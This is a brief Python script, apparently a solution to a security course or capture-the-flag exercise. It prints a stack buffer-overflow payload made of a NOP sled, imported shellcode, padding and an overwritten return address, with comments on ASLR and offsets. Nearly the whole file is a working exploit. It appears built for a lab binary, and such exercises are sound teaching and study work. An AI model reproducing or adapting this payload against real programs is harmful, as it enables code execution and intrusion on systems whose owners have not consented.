#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
# 0xfffec010 - high address, esp
# 400 since 256 sized aslr but for safety
# 613 padding bytes to access retval
sys.stdout.buffer.write(400*b'\x90' + shellcode + b'\x90'*613 +pack('<I', 0xfffec050))
